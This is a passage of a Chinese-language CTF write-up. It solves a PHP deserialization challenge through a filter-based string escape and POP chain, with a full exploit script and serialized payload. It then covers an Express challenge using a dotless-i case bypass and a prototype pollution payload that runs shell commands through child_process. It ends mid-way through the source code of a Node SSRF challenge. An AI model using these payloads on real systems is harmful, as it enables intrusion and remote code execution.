<p>&#x9996;&#x5148;&#x662F;&#x5F88;&#x660E;&#x663E;&#x7684;&#x5C3E;&#x90E8;&#x9003;&#x9038;</p>
<pre><code class="lang-php"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">safe</span><span class="hljs-params">($parm)</span></span>{
    $array= <span class="hljs-keyword">array</span>(<span class="hljs-string">&apos;union&apos;</span>,<span class="hljs-string">&apos;regexp&apos;</span>,<span class="hljs-string">&apos;load&apos;</span>,<span class="hljs-string">&apos;into&apos;</span>,<span class="hljs-string">&apos;flag&apos;</span>,<span class="hljs-string">&apos;file&apos;</span>,<span class="hljs-string">&apos;insert&apos;</span>,<span class="hljs-string">&quot;&apos;&quot;</span>,<span class="hljs-string">&apos;\\&apos;</span>,<span class="hljs-string">&quot;*&quot;</span>,<span class="hljs-string">&quot;alter&quot;</span>);
    <span class="hljs-keyword">return</span> str_replace($array,<span class="hljs-string">&apos;hacker&apos;</span>,$parm);
}
<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">User</span></span>{
    ...
    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">getNewInfo</span><span class="hljs-params">()</span></span>{<span class="hljs-comment">//</span>
        $age=$_POST[<span class="hljs-string">&apos;age&apos;</span>];
        $nickname=$_POST[<span class="hljs-string">&apos;nickname&apos;</span>];<span class="hljs-comment">//&#x53EF;&#x4EE5;&#x6784;&#x9020; len(payload)*&quot;union&quot;+payload &#x6765;&#x8986;&#x76D6;Ctrl</span>
        <span class="hljs-keyword">return</span> safe(serialize(<span class="hljs-keyword">new</span> Info($age,$nickname)));
    }
    ...
}
</code></pre>
<p>&#x8FD9;&#x5C31;&#x9020;&#x6210;nickname&#x53EF;&#x63A7;&#xFF0C;&#x7136;&#x540E;&#x627E;POP&#x94FE;</p>
<pre><code class="lang-php"><span class="hljs-meta">&lt;?php</span>
error_reporting(<span class="hljs-number">0</span>);
session_start();
<span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">safe</span><span class="hljs-params">($parm)</span></span>{
    $array= <span class="hljs-keyword">array</span>(<span class="hljs-string">&apos;union&apos;</span>,<span class="hljs-string">&apos;regexp&apos;</span>,<span class="hljs-string">&apos;load&apos;</span>,<span class="hljs-string">&apos;into&apos;</span>,<span class="hljs-string">&apos;flag&apos;</span>,<span class="hljs-string">&apos;file&apos;</span>,<span class="hljs-string">&apos;insert&apos;</span>,<span class="hljs-string">&quot;&apos;&quot;</span>,<span class="hljs-string">&apos;\\&apos;</span>,<span class="hljs-string">&quot;*&quot;</span>,<span class="hljs-string">&quot;alter&quot;</span>);
    <span class="hljs-keyword">return</span> str_replace($array,<span class="hljs-string">&apos;hacker&apos;</span>,$parm);
}
<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">User</span>
</span>{
    <span class="hljs-keyword">public</span> $id;
    <span class="hljs-keyword">public</span> $age=<span class="hljs-keyword">null</span>;
    <span class="hljs-keyword">public</span> $nickname=<span class="hljs-keyword">null</span>;
    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">login</span><span class="hljs-params">()</span> </span>{
        <span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>($_POST[<span class="hljs-string">&apos;username&apos;</span>])&amp;&amp;<span class="hljs-keyword">isset</span>($_POST[<span class="hljs-string">&apos;password&apos;</span>])){
            $mysqli=<span class="hljs-keyword">new</span> dbCtrl();
            $this-&gt;id=$mysqli-&gt;login(<span class="hljs-string">&apos;select id,password from user where username=?&apos;</span>);
            <span class="hljs-keyword">if</span>($this-&gt;id){
            $_SESSION[<span class="hljs-string">&apos;id&apos;</span>]=$this-&gt;id;
            $_SESSION[<span class="hljs-string">&apos;login&apos;</span>]=<span class="hljs-number">1</span>;
            <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&#x4F60;&#x7684;ID&#x662F;&quot;</span>.$_SESSION[<span class="hljs-string">&apos;id&apos;</span>];
            <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&#x4F60;&#x597D;&#xFF01;&quot;</span>.$_SESSION[<span class="hljs-string">&apos;token&apos;</span>];
            <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;script&gt;window.location.href=&apos;./update.php&apos;&lt;/script&gt;&quot;</span>;
            <span class="hljs-keyword">return</span> $this-&gt;id;
            }
        }
    }
    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">update</span><span class="hljs-params">()</span></span>{<span class="hljs-comment">//0&lt;-</span>
        $Info=unserialize($this-&gt;getNewinfo());<span class="hljs-comment">//5-&gt;</span>
        $age=$Info-&gt;age;
        $nickname=$Info-&gt;nickname;
        $updateAction=<span class="hljs-keyword">new</span> UpdateHelper($_SESSION[<span class="hljs-string">&apos;id&apos;</span>],$Info,<span class="hljs-string">&quot;update user SET age=$age,nickname=$nickname where id=&quot;</span>.$_SESSION[<span class="hljs-string">&apos;id&apos;</span>]);<span class="hljs-comment">//4-&gt;</span>
        <span class="hljs-comment">//&#x8FD9;&#x4E2A;&#x529F;&#x80FD;&#x8FD8;&#x6CA1;&#x6709;&#x5199;&#x5B8C; &#x5148;&#x5360;&#x5751;</span>
    }
    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">getNewInfo</span><span class="hljs-params">()</span></span>{<span class="hljs-comment">//5&lt;-</span>
        $age=$_POST[<span class="hljs-string">&apos;age&apos;</span>];<span class="hljs-comment">//len(payload)*&quot;union&quot;+payload(nickname)</span>
        $nickname=$_POST[<span class="hljs-string">&apos;nickname&apos;</span>];
        <span class="hljs-keyword">return</span> safe(serialize(<span class="hljs-keyword">new</span> Info($age,$nickname)));<span class="hljs-comment">//6-&gt;</span>
    }
    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span><span class="hljs-params">()</span></span>{
        <span class="hljs-keyword">return</span> file_get_contents($this-&gt;nickname);<span class="hljs-comment">//&#x5371; //&#x6CA1;&#x5F97;&#x8F93;&#x51FA;&#x5229;&#x7528;</span>
    }
    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__toString</span><span class="hljs-params">()</span>//3&lt;-
    </span>{
        $this-&gt;nickname-&gt;update($this-&gt;age);<span class="hljs-comment">//1-&gt; (nickname = Info)</span>
        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;0-0&quot;</span>;
    }
}
<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Info</span></span>{
    <span class="hljs-keyword">public</span> $age;
    <span class="hljs-keyword">public</span> $nickname;
    <span class="hljs-keyword">public</span> $CtrlCase;
    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span><span class="hljs-params">($age,$nickname)</span></span>{
        $this-&gt;age=$age;
        $this-&gt;nickname=$nickname;
    }
    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__call</span><span class="hljs-params">($name,$argument)</span></span>{<span class="hljs-comment">//1&lt;-</span>
        <span class="hljs-keyword">echo</span> $this-&gt;CtrlCase-&gt;login($argument[<span class="hljs-number">0</span>]);<span class="hljs-comment">//2-&gt; (CtrlCase Login) age=sql</span>
    }
}
<span class="hljs-class"><span class="hljs-keyword">Class</span> <span class="hljs-title">UpdateHelper</span></span>{
    <span class="hljs-keyword">public</span> $id;
    <span class="hljs-keyword">public</span> $newinfo;
    <span class="hljs-keyword">public</span> $sql;
    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span><span class="hljs-params">($newInfo,$sql)</span></span>{
        $newInfo=unserialize($newInfo);
        $upDate=<span class="hljs-keyword">new</span> dbCtrl();
    }
    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span><span class="hljs-params">()</span>//4&lt;-
    </span>{
        <span class="hljs-keyword">echo</span> $this-&gt;sql;<span class="hljs-comment">//3-&gt; (__toStrings()) sql = User</span>
    }
}
<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">dbCtrl</span>
</span>{
    <span class="hljs-keyword">public</span> $hostname=<span class="hljs-string">&quot;127.0.0.1&quot;</span>;
    <span class="hljs-keyword">public</span> $dbuser=<span class="hljs-string">&quot;root&quot;</span>;
    <span class="hljs-keyword">public</span> $dbpass=<span class="hljs-string">&quot;root&quot;</span>;
    <span class="hljs-keyword">public</span> $database=<span class="hljs-string">&quot;test&quot;</span>;
    <span class="hljs-keyword">public</span> $name;
    <span class="hljs-keyword">public</span> $password;
    <span class="hljs-keyword">public</span> $mysqli;
    <span class="hljs-keyword">public</span> $token;
    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span><span class="hljs-params">()</span>
    </span>{
        $this-&gt;name=$_POST[<span class="hljs-string">&apos;username&apos;</span>];
        $this-&gt;password=$_POST[<span class="hljs-string">&apos;password&apos;</span>];
        $this-&gt;token=$_SESSION[<span class="hljs-string">&apos;token&apos;</span>];
    }
    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">login</span><span class="hljs-params">($sql)</span>
    </span>{
        $this-&gt;mysqli=<span class="hljs-keyword">new</span> mysqli($this-&gt;hostname, $this-&gt;dbuser, $this-&gt;dbpass, $this-&gt;database);
        <span class="hljs-keyword">if</span> ($this-&gt;mysqli-&gt;connect_error) {
            <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;&#x8FDE;&#x63A5;&#x5931;&#x8D25;&#xFF0C;&#x9519;&#x8BEF;:&quot;</span> . $this-&gt;mysqli-&gt;connect_error);
        }
        $result=$this-&gt;mysqli-&gt;prepare($sql);
        $result-&gt;bind_param(<span class="hljs-string">&apos;s&apos;</span>, $this-&gt;name);
        $result-&gt;execute();
        $result-&gt;bind_result($idResult, $passwordResult);
        $result-&gt;fetch();
        $result-&gt;close();
        <span class="hljs-keyword">if</span> ($this-&gt;token==<span class="hljs-string">&apos;admin&apos;</span>) {
            <span class="hljs-keyword">return</span> $idResult;
        }
        <span class="hljs-keyword">if</span> (!$idResult) {
            <span class="hljs-keyword">echo</span>(<span class="hljs-string">&apos;&#x7528;&#x6237;&#x4E0D;&#x5B58;&#x5728;!&apos;</span>);
            <span class="hljs-keyword">return</span> <span class="hljs-keyword">false</span>;
        }
        <span class="hljs-keyword">if</span> (md5($this-&gt;password)!==$passwordResult) {
            <span class="hljs-keyword">echo</span>(<span class="hljs-string">&apos;&#x5BC6;&#x7801;&#x9519;&#x8BEF;&#xFF01;&apos;</span>);
            <span class="hljs-keyword">return</span> <span class="hljs-keyword">false</span>;
        }
        $_SESSION[<span class="hljs-string">&apos;token&apos;</span>]=$this-&gt;name;
        <span class="hljs-keyword">return</span> $idResult;
    }
    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">update</span><span class="hljs-params">($sql)</span>
    </span>{
        <span class="hljs-comment">//&#x8FD8;&#x6CA1;&#x6765;&#x5F97;&#x53CA;&#x5199;</span>
    }
}
</code></pre>
<p>&#x5206;&#x6790;&#x6E90;&#x7801;&#x4ECE;<code>update.php</code>&#x4E2D;<code>update()</code>&#x4F20;&#x5165;(0)&#x6784;&#x9020;&#x4E00;&#x4E2A;&#x53EF;&#x63A7;&#x7684;<code>$Info</code>(5),&#x5982;&#x679C;&#x6211;&#x4EEC;&#x60F3;&#x8981;&#x4F20;&#x5165;&#x53EF;&#x63A7;&#x7684;&#x7684;sql&#x7684;&#x8BDD;&#xFF0C;&#x53EF;&#x4EE5;&#x628A;CtrlCase&#x641E;&#x6210;<code>UpdateHelper</code>&#x9500;&#x6BC1;&#x65F6;&#x8C03;&#x7528;<code>__destruct()</code>(4)&#x8FD9;&#x65F6;&#x5019;&#x5982;&#x679C;<code>$sql</code>&#x662F;<code>User</code>&#x90A3;&#x4E48;&#x89E6;&#x53D1;<code>__toString()</code>(3)&#x5982;&#x679C;<code>nickname = Info</code>&#x5219;&#x89E6;&#x53D1;(1)&#x7136;&#x540E;<code>CtrlCase</code>&#x4E3A;&#x4E00;&#x4E2A;<code>dbCtrl</code>&#x5219;&#x53EF;&#x4EE5;&#x6267;&#x884C;<code>sql</code>&#x4E5F;&#x5373;<code>$age</code>(2)</p>
<p>&#x7136;&#x540E;&#x53EF;&#x4EE5;&#x6839;&#x636E;POP&#x94FE;&#x5199;&#x51FA;&#x521D;&#x6B65;&#x7684;Exp</p>
<pre><code class="lang-php"><span class="hljs-meta">&lt;?php</span>
<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">dbCtrl</span>
</span>{
    <span class="hljs-keyword">public</span> $hostname=<span class="hljs-string">&quot;127.0.0.1&quot;</span>;
    <span class="hljs-keyword">public</span> $dbuser=<span class="hljs-string">&quot;root&quot;</span>;
    <span class="hljs-keyword">public</span> $dbpass=<span class="hljs-string">&quot;root&quot;</span>;
    <span class="hljs-keyword">public</span> $database=<span class="hljs-string">&quot;test&quot;</span>;
    <span class="hljs-keyword">public</span> $name=<span class="hljs-string">&quot;admin&quot;</span>;
    <span class="hljs-keyword">public</span> $password;
    <span class="hljs-keyword">public</span> $mysqli;
    <span class="hljs-keyword">public</span> $token=<span class="hljs-string">&quot;admin&quot;</span>;

    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">login</span><span class="hljs-params">($sql)</span>
    </span>{
        $this-&gt;mysqli=<span class="hljs-keyword">new</span> mysqli($this-&gt;hostname, $this-&gt;dbuser, $this-&gt;dbpass, $this-&gt;database);
        <span class="hljs-keyword">if</span> ($this-&gt;mysqli-&gt;connect_error) {
            <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;&#x8FDE;&#x63A5;&#x5931;&#x8D25;&#xFF0C;&#x9519;&#x8BEF;:&quot;</span> . $this-&gt;mysqli-&gt;connect_error);
        }
        $result=$this-&gt;mysqli-&gt;prepare($sql);
        $result-&gt;bind_param(<span class="hljs-string">&apos;s&apos;</span>, $this-&gt;name);
        $result-&gt;execute();
        $result-&gt;bind_result($idResult, $passwordResult);
        $result-&gt;fetch();
        $result-&gt;close();
        <span class="hljs-keyword">if</span> ($this-&gt;token==<span class="hljs-string">&apos;admin&apos;</span>) {
            <span class="hljs-keyword">return</span> $idResult;
        }
        <span class="hljs-keyword">if</span> (!$idResult) {
            <span class="hljs-keyword">echo</span>(<span class="hljs-string">&apos;&#x7528;&#x6237;&#x4E0D;&#x5B58;&#x5728;!&apos;</span>);
            <span class="hljs-keyword">return</span> <span class="hljs-keyword">false</span>;
        }
        <span class="hljs-keyword">if</span> (md5($this-&gt;password)!==$passwordResult) {
            <span class="hljs-keyword">echo</span>(<span class="hljs-string">&apos;&#x5BC6;&#x7801;&#x9519;&#x8BEF;&#xFF01;&apos;</span>);
            <span class="hljs-keyword">return</span> <span class="hljs-keyword">false</span>;
        }
        $_SESSION[<span class="hljs-string">&apos;token&apos;</span>]=$this-&gt;name;
        <span class="hljs-keyword">return</span> $idResult;
    }
}

$dbc= <span class="hljs-keyword">new</span> dbCtrl();

<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Info</span></span>{
    <span class="hljs-keyword">public</span> $age;
    <span class="hljs-keyword">public</span> $nickname;
    <span class="hljs-keyword">public</span> $CtrlCase;
    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span><span class="hljs-params">($age,$nickname)</span></span>{
        $this-&gt;age=$age;
        $this-&gt;nickname=$nickname;
    }
}

$info=<span class="hljs-keyword">new</span> Info(<span class="hljs-string">&quot;233&quot;</span>,<span class="hljs-string">&quot;233&quot;</span>);
$info-&gt;CtrlCase = $dbc;

<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">User</span>
</span>{
    <span class="hljs-keyword">public</span> $id;
    <span class="hljs-keyword">public</span> $age;
    <span class="hljs-keyword">public</span> $nickname;
}

$usr = <span class="hljs-keyword">new</span> User();
$usr-&gt;age =<span class="hljs-string">&quot;select password,id from user where username=?&quot;</span>;
$usr-&gt;nickname=$info;

<span class="hljs-class"><span class="hljs-keyword">Class</span> <span class="hljs-title">UpdateHelper</span></span>{
    <span class="hljs-keyword">public</span> $id;
    <span class="hljs-keyword">public</span> $newinfo;
    <span class="hljs-keyword">public</span> $sql;
    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span><span class="hljs-params">($newInfo,$sql)</span></span>{
        $newInfo=unserialize($newInfo);
        $upDate=<span class="hljs-keyword">new</span> dbCtrl();
    }
}

$upd = <span class="hljs-keyword">new</span> UpdateHelper(<span class="hljs-string">&quot;233&quot;</span>,<span class="hljs-string">&quot;233&quot;</span>);
$upd-&gt;sql = $usr;

$info2=<span class="hljs-keyword">new</span> Info(<span class="hljs-string">&quot;1&quot;</span>,<span class="hljs-string">&quot;233&quot;</span>);
$info2-&gt;CtrlCase=$upd;

<span class="hljs-keyword">echo</span> serialize($info2);
<span class="hljs-comment">//O:4:&quot;Info&quot;:3:{s:3:&quot;age&quot;;s:1:&quot;1&quot;;s:8:&quot;nickname&quot;;s:3:&quot;233&quot;;s:8:&quot;CtrlCase&quot;;O:12:&quot;UpdateHelper&quot;:3:{s:2:&quot;id&quot;;N;s:7:&quot;newinfo&quot;;N;s:3:&quot;sql&quot;;O:4:&quot;User&quot;:3:{s:2:&quot;id&quot;;N;s:3:&quot;age&quot;;s:45:&quot;select password,id from user where username=?&quot;;s:8:&quot;nickname&quot;;O:4:&quot;Info&quot;:3:{s:3:&quot;age&quot;;s:3:&quot;233&quot;;s:8:&quot;nickname&quot;;s:3:&quot;233&quot;;s:8:&quot;CtrlCase&quot;;O:6:&quot;dbCtrl&quot;:8:{s:8:&quot;hostname&quot;;s:9:&quot;127.0.0.1&quot;;s:6:&quot;dbuser&quot;;s:4:&quot;root&quot;;s:6:&quot;dbpass&quot;;s:4:&quot;root&quot;;s:8:&quot;database&quot;;s:4:&quot;test&quot;;s:4:&quot;name&quot;;s:5:&quot;admin&quot;;s:8:&quot;password&quot;;N;s:6:&quot;mysqli&quot;;N;s:5:&quot;token&quot;;s:5:&quot;admin&quot;;}}}}}</span>

<span class="hljs-meta">?&gt;</span>
</code></pre>
<pre><code>payload=&quot;&quot;&quot;&quot;;s:8:&quot;CtrlCase&quot;;O:12:&quot;UpdateHelper&quot;:3:{s:2:&quot;id&quot;;N;s:7:&quot;newinfo&quot;;N;s:3:&quot;sql&quot;;O:4:&quot;User&quot;:3:{s:2:&quot;id&quot;;N;s:3:&quot;age&quot;;s:45:&quot;select password,id from user where username=?&quot;;s:8:&quot;nickname&quot;;O:4:&quot;Info&quot;:3:{s:3:&quot;age&quot;;s:3:&quot;233&quot;;s:8:&quot;nickname&quot;;s:3:&quot;233&quot;;s:8:&quot;CtrlCase&quot;;O:6:&quot;dbCtrl&quot;:8:{s:8:&quot;hostname&quot;;s:9:&quot;127.0.0.1&quot;;s:6:&quot;dbuser&quot;;s:4:&quot;root&quot;;s:6:&quot;dbpass&quot;;s:4:&quot;root&quot;;s:8:&quot;database&quot;;s:4:&quot;test&quot;;s:4:&quot;name&quot;;s:5:&quot;admin&quot;;s:8:&quot;password&quot;;N;s:6:&quot;mysqli&quot;;N;s:5:&quot;token&quot;;s:5:&quot;admin&quot;;}}}}}&quot;&quot;&quot;

&quot;union&quot;*len(payload)+payload
</code></pre><p>&#x5229;&#x7528;&#x5C3E;&#x90E8;&#x9003;&#x9038;&#x641E;&#x4E00;&#x4E2A;&#x8FD9;&#x6837;&#x7684;<code>Info</code> <code>&quot;union&quot;*len(payload)+payload</code>
&#x7136;&#x540E;&#x62FF;&#x5230;&#x5BC6;&#x7801;md5,&#x8FD9;&#x91CC;&#x53EF;&#x4EE5;&#x53CD;&#x67E5;&#x51FA;&#x6765;&#xFF0C;&#x5F53;&#x7136;&#x65E2;&#x7136;&#x53EF;&#x4EE5;&#x4EFB;&#x610F;sql&#x7684;&#x8BDD;&#x8FD8;&#x53EF;&#x4EE5;&#x76F4;&#x63A5;&#x6CE8;,</p>
<h2 id="ezexpress"><a name="ezexpress" class="anchor-navigation-ex-anchor" href="#ezexpress"><i class="fa fa-link" aria-hidden="true"></i></a>Ez_Express</h2>
<p><code>www.zip</code>&#x6E90;&#x7801;&#x6CC4;&#x9732;</p>
<p>&#x53D1;&#x73B0;&#x662F;js&#x5199;&#x7684;</p>
<p>&#x6D89;&#x53CA;&#x5230;JS<code>toUpperCase()</code>&#x7684;&#x5B89;&#x5168;&#x6027;&#x95EE;&#x9898;</p>
<p>&#x5229;&#x7528;<code>&#x131;</code>-&gt;<code>I</code> &#x7ED5;&#x8FC7;&#x6CE8;&#x518C; admin</p>
<pre><code class="lang-js"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">safeKeyword</span>(<span class="hljs-params">keyword</span>) </span>{
  <span class="hljs-keyword">if</span>(keyword.match(<span class="hljs-regexp">/(admin)/i</span>s)) {
      <span class="hljs-keyword">return</span> keyword
  }

  <span class="hljs-keyword">return</span> <span class="hljs-literal">undefined</span>
}
req.session.user={
    <span class="hljs-string">&apos;user&apos;</span>:req.body.userid.toUpperCase(),
    <span class="hljs-string">&apos;passwd&apos;</span>: req.body.pwd,
    <span class="hljs-string">&apos;isLogin&apos;</span>:<span class="hljs-literal">false</span>
}
</code></pre>
<p>&#x7136;&#x540E;&#x53EF;&#x4EE5;post&#x5230;action&#x8FD9;&#x91CC;&#x53C8;&#x6D89;&#x53CA;&#x5230;js&#x539F;&#x578B;&#x94FE;&#x6C61;&#x67D3;</p>
<p>&#x5229;&#x7528;<code>merge</code>,<code>clone</code>
&#x6C61;&#x67D3;&#x8FD9;&#x91CC;&#x7684;<code>outputFunctionName</code></p>
<pre><code class="lang-js">router.get(<span class="hljs-string">&apos;/&apos;</span>, <span class="hljs-function"><span class="hljs-keyword">function</span> (<span class="hljs-params">req, res</span>) </span>{
    <span class="hljs-keyword">if</span> (!req.session.user) {
        res.redirect(<span class="hljs-string">&apos;/login&apos;</span>);
    }
    res.outputFunctionName = <span class="hljs-literal">undefined</span>;
    res.render(<span class="hljs-string">&apos;index&apos;</span>, data = {<span class="hljs-string">&apos;user&apos;</span>: req.session.user.user});
});
</code></pre>
<p>Content-Type&#x8F6C;&#x6210; application/json
payload:</p>
<pre><code class="lang-js">{<span class="hljs-string">&quot;lua&quot;</span>:<span class="hljs-string">&quot;a&quot;</span>,<span class="hljs-string">&quot;__proto__&quot;</span>:{<span class="hljs-string">&quot;outputFunctionName&quot;</span>:<span class="hljs-string">&quot;a=1;return global.process.mainModule.constructor._load(&apos;child_process&apos;).execSync(&apos;cat /flag&apos;)//&quot;</span>},<span class="hljs-string">&quot;Submit&quot;</span>:<span class="hljs-string">&quot;&quot;</span>}
</code></pre>
<h3 id="&#x53C2;&#x8003;&#x8D44;&#x6599;_1"><a name="&#x53C2;&#x8003;&#x8D44;&#x6599;_1" class="anchor-navigation-ex-anchor" href="#&#x53C2;&#x8003;&#x8D44;&#x6599;_1"><i class="fa fa-link" aria-hidden="true"></i></a>&#x53C2;&#x8003;&#x8D44;&#x6599;</h3>
<p>javascript-up-low-ercase-tip:
<a href="http://www.leavesongs.com/HTML/javascript-up-low-ercase-tip.html" target="_blank">http://www.leavesongs.com/HTML/javascript-up-low-ercase-tip.html</a></p>
<p>&#x4ECE;&#x676D;&#x7535;hgame-week4&#x5B66;&#x539F;&#x578B;&#x94FE;&#x6C61;&#x67D3;:
<a href="https://www.jianshu.com/p/6e623e9debe3" target="_blank">https://www.jianshu.com/p/6e623e9debe3</a></p>
<p>&#x6DF1;&#x5165;&#x7406;&#x89E3; JavaScript Prototype &#x6C61;&#x67D3;&#x653B;&#x51FB;
<a href="https://www.leavesongs.com/PENETRATION/javascript-prototype-pollution-attack.html" target="_blank">https://www.leavesongs.com/PENETRATION/javascript-prototype-pollution-attack.html</a></p>
<h2 id="node-game"><a name="node-game" class="anchor-navigation-ex-anchor" href="#node-game"><i class="fa fa-link" aria-hidden="true"></i></a>Node Game</h2>
<p>&#x7ED9;&#x4E86;&#x6E90;&#x7801;</p>
<pre><code class="lang-js"><span class="hljs-keyword">var</span> express = <span class="hljs-built_in">require</span>(<span class="hljs-string">&apos;express&apos;</span>);
<span class="hljs-keyword">var</span> app = express();
<span class="hljs-keyword">var</span> fs = <span class="hljs-built_in">require</span>(<span class="hljs-string">&apos;fs&apos;</span>);
<span class="hljs-keyword">var</span> path = <span class="hljs-built_in">require</span>(<span class="hljs-string">&apos;path&apos;</span>);
<span class="hljs-keyword">var</span> http = <span class="hljs-built_in">require</span>(<span class="hljs-string">&apos;http&apos;</span>);
<span class="hljs-keyword">var</span> pug = <span class="hljs-built_in">require</span>(<span class="hljs-string">&apos;pug&apos;</span>);
<span class="hljs-keyword">var</span> morgan = <span class="hljs-built_in">require</span>(<span class="hljs-string">&apos;morgan&apos;</span>);
<span class="hljs-keyword">const</span> multer = <span class="hljs-built_in">require</span>(<span class="hljs-string">&apos;multer&apos;</span>);


app.use(multer({dest: <span class="hljs-string">&apos;./dist&apos;</span>}).array(<span class="hljs-string">&apos;file&apos;</span>));
app.use(morgan(<span class="hljs-string">&apos;short&apos;</span>));
app.use(<span class="hljs-string">&quot;/uploads&quot;</span>,express.static(path.join(__dirname, <span class="hljs-string">&apos;/uploads&apos;</span>)))
app.use(<span class="hljs-string">&quot;/template&quot;</span>,express.static(path.join(__dirname, <span class="hljs-string">&apos;/template&apos;</span>)))


app.get(<span class="hljs-string">&apos;/&apos;</span>, <span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params">req, res</span>) </span>{
    <span class="hljs-keyword">var</span> action = req.query.action?req.query.action:<span class="hljs-string">&quot;index&quot;</span>;
    <span class="hljs-keyword">if</span>( action.includes(<span class="hljs-string">&quot;/&quot;</span>) || action.includes(<span class="hljs-string">&quot;\\&quot;</span>) ){
        res.send(<span class="hljs-string">&quot;Errrrr, You have been Blocked&quot;</span>);
    }
    file = path.join(__dirname + <span class="hljs-string">&apos;/template/&apos;</span>+ action +<span class="hljs-string">&apos;.pug&apos;</span>);
    <span class="hljs-keyword">var</span> html = pug.renderFile(file);
    res.send(html);
});

app.post(<span class="hljs-string">&apos;/file_upload&apos;</span>, <span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params">req, res</span>)</span>{
    <span class="hljs-keyword">var</span> ip = req.connection.remoteAddress;
    <span class="hljs-keyword">var</span> obj = {
        msg: <span class="hljs-string">&apos;&apos;</span>,
    }
    <span class="hljs-keyword">if</span> (!ip.includes(<span class="hljs-string">&apos;127.0.0.1&apos;</span>)) {
        obj.msg=<span class="hljs-string">&quot;only admin&apos;s ip can use it&quot;</span>
        res.send(<span class="hljs-built_in">JSON</span>.stringify(obj));
        <span class="hljs-keyword">return</span> 
    }
    fs.readFile(req.files[<span class="hljs-number">0</span>].path, <span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params">err, data</span>)</span>{
        <span class="hljs-keyword">if</span>(err){
            obj.msg = <span class="hljs-string">&apos;upload failed&apos;</span>;
            res.send(<span class="hljs-built_in">JSON</span>.stringify(obj));
        }<span class="hljs-keyword">else</span>{
            <span class="hljs-keyword">var</span> file_path = <span class="hljs-string">&apos;/uploads/&apos;</span> + req.files[<span class="hljs-number">0</span>].mimetype +<span class="hljs-string">&quot;/&quot;</span>;
            <span class="hljs-keyword">var</span> file_name = req.files[<span class="hljs-number">0</span>].originalname
            <span class="hljs-keyword">var</span> dir_file = __dirname + file_path + file_name
            <span class="hljs-keyword">if</span>(!fs.existsSync(__dirname + file_path)){
                <span class="hljs-keyword">try</span> {
                    fs.mkdirSync(__dirname + file_path)
                } <span class="hljs-keyword">catch</span> (error) {
                    obj.msg = <span class="hljs-string">&quot;file type error&quot;</span>;
                    res.send(<span class="hljs-built_in">JSON</span>.stringify(obj));
                    <span class="hljs-keyword">return</span>
                }
            }
            <span class="hljs-keyword">try</span> {
                fs.writeFileSync(dir_file,data)
                obj = {
                    msg: <span class="hljs-string">&apos;upload success&apos;</span>,
                    filename: file_path + file_name
                } 
            } <span class="hljs-keyword">catch</span> (error) {
                obj.msg = <span class="hljs-string">&apos;upload failed&apos;</span>;
            }
            res.send(<span class="hljs-built_in">JSON</span>.stringify(obj));    
        }
    })
})

app.get(<span class="hljs-string">&apos;/source&apos;</span>, <span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params">req, res</span>) </span>{
    res.sendFile(path.join(__dirname + <span class="hljs-string">&apos;/template/source.txt&apos;</span>));
});


app.get(<span class="hljs-string">&apos;/core&apos;</span>, <span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params">req, res</span>) </span>{<span class="hljs-comment">//&#x8FD9;&#x91CC;&#x53EF;&#x4EE5;&#x8FDB;&#x884C;SSRF</span>
    <span class="hljs-keyword">var</span> q = req.query.q;
    <span class="hljs-keyword">var</span> resp = <span class="hljs-string">&quot;&quot;</span>;
    <span class="hljs-keyword">if</span> (q) {
        <span class="hljs-keyword">var</span> url = <span class="hljs-string">&apos;http://localhost:8081/source?&apos;</span> + q
        <span class="hljs-built_in">console</span>.log(url)
        <span class="hljs-keyword">var</span> trigger = blacklist(url);
        <span class="hljs-keyword">if</span> (trigger === <span class="hljs-literal">true</span>) {
